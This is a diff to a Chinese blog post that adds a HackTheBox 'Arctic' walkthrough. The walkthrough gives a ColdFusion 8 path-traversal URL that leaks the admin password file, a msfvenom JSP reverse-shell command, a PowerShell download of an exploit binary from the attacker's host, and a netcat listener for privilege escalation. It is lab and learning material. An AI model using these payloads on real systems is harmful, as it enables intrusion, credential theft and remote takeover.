@@ -137,6 +137,8 @@
             
             <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
             
+            <li><a target="_blank" href="https://kuibarj.top">小伙伴</a></li>
+            
         </ul>
     </div>
 </div>
@@ -224,7 +226,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-09 14:56:45'>2019-10-09 11:04</time>
+        创建时间:<time class="date" title='更新时间: 2019-10-10 16:24:12'>2019-10-09 11:04</time>
         
     </div>
     <div class="article-meta">
@@ -262,7 +264,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="htb之Arctic"><a href="#htb之Arctic" class="headerlink" title="htb之Arctic"></a>htb之Arctic</h1><p>10.10.10.11<br>nmap收集信息<br><img src="/images/1.png" alt><br>然后发现8500开放着，一个有意思的端口<br>ColdFusion的Macromedia公司/ Adobe ColdFusion，请默认Web服务器端口<br><img src="/images/2.png" alt><br>随便找找就找到了后台登陆窗口，看来连目录爆破都省了<br><img src="/images/3.png" alt><br>ColdFusion 8 漏洞搜索一波<br><img src="/images/4.png" alt><br>发现有个目录遍历漏洞</p>
+        <h1 id="htb之Arctic"><a href="#htb之Arctic" class="headerlink" title="htb之Arctic"></a>htb之Arctic</h1><p>10.10.10.11<br>nmap收集信息<br><img src="/images/1.png" alt><br>然后发现8500开放着，一个有意思的端口<br>ColdFusion的Macromedia公司/ Adobe ColdFusion，请默认Web服务器端口<br><img src="/images/2.png" alt><br>随便找找就找到了后台登陆窗口，看来连目录爆破都省了<br><img src="/images/3.png" alt><br>ColdFusion 8 漏洞搜索一波<br><img src="/images/4.png" alt><br><img src="/images/5.png" alt><br>但是仅限msf，来吧组合一下<br><a href="http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en" target="_blank" rel="noopener">http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</a><br><img src="/images/6.png" alt><br>OK！password出来了，接下来就是破解密码了<br><a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a><br><img src="/images/7.png" alt><br>嗯，密码是愉快的一天<br>进去之后就使寻找可以get shell的地方了<br><img src="/images/8.png" alt></p>
+<blockquote>
+<p>这里有一个上传点<br>用msfvenom生成一个后门<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=<your port to connect on> -f raw &gt; shell.jsp<br>最后用瑞士军刀接收或者用msf监听也行<br><img src="/images/9.png" alt><br>最后就是提权了，有两种方法提权<br>1.msf直接生成后门<br>2.寻找可用的windows内核漏洞<br><a href="https://github.com/egre55/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/egre55/windows-kernel-exploits</a><br>这里我用的是ms10-059<br>一个简易的web：python -m SimpleHTTPServer 80<br>cmd命令行窗口直接下载：powershell (new-object System.Net.WebClient).DownloadFile( ‘<a href="http://192.168.168.183/1.exe’,’C:\111111111111111.exe’" target="_blank" rel="noopener">http://192.168.168.183/1.exe’,’C:\111111111111111.exe’</a>)<br>cmd：111.exe 攻击机IP 4444<br>攻击机：nc -l 4444<br>传送过目标机之后直接瑞士军刀监听，成功administrator权限</your></your></p>
+</blockquote>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -276,7 +281,7 @@
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
     <p><span class="copy-title">发布时间:</span>2019-10-09, 11:04:11</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-09, 14:56:45</p>
+    <p><span class="copy-title">最后更新:</span>2019-10-10, 16:24:12</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/09/htb之Arctic/" title="htb之Arctic">http://yoursite.com/2019/10/09/htb之Arctic/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
